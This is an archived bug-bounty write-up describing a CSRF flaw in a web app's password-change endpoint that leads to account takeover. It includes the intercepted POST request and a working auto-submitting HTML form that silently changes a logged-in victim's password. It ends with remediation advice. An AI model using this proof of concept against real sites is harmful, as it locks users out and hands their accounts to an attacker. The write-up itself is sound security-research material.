# CSRF leading to Account Takeover

- **Source URL:** https://medium.com/@katmaca2014/csrf-leading-to-account-takeover-abb32bae0ba5?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240525180617/https://medium.com/@katmaca2014/csrf-leading-to-account-takeover-abb32bae0ba5?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6201 (id 6201)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# CSRF leading to Account Takeover

Today, I’d like to share an account takeover I uncovered during my latest web penetration test. As is my routine, I began by familiarizing myself with the web application. After some exploration, I directed my attention to the account settings section, a great hunting ground for vulnerabilities.

While looking around in the account settings page with my proxy Burp Suite at the ready, I stumbled upon an endpoint labeled “**/changePassword**” What caught my eye was the absence of a request for the user’s old password, the application only prompted for a new one. This piqued my interest — **could this seemingly minor flaw be exploited further, perhaps it could lead to CSRF?**

To delve deeper, I executed a dummy password change and intercepted the ensuing HTTP request. To my astonishment, there was no CSRF protection in place; only the new password and its confirmation were transmitted via a straightforward POST request. Realizing that there wasn’t an old password verification and CSRF tokens — I discerned a pathway to an account takeover.

**HTTP Request:**

```
POST /Home/ChangePassword HTTP/1.1
Host: target
Cookie: ********
User-Agent: Mozilla/5.0 
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 38
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
closenewPassword=NEWPASSWORD&password=NEWPASSWORD
```
With the vulnerability identified, the next crucial step was to exploit it by crafting a malicious link. This link would act as a trap; when clicked by a logged-in user, it would leverage their existing session cookies along with my crafted request, allowing me to execute a password change of my choosing on their account. To do so I created a HTML code which would be the proof of concept.

**CSRF PoC** (this code was embedded into a link):

```
<html>
  <body>
    <form action="<https://target.com/Home/ChangePassword>" method="POST">
      <input type="hidden" name="newPassword" value="NEWPASSWORD;" />
      <input type="hidden" name="password" value="NEWPASSWORD" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
After creating the malicious link containing the code to alter the user’s password at will, I awaited the unwitting click of the victim. Since this was a controlled environment, the user complied, and in an instant, their password was altered, locking them out of their own account. Meanwhile, with the credentials which I had made them change I gained access to their account.

Image of the targets browser after the link was clicked:

In summary, the developers inadvertently opened the door to a significant exploit — a full-blown account takeover via CSRF (CWE-352). Against his vulnerability the implementation of unique CSRF tokens for each action, coupled with a requirement for the user’s old password during password changes. Such measures would significantly raise the bar for potential attackers, fortifying the application’s defenses against such intrusions.
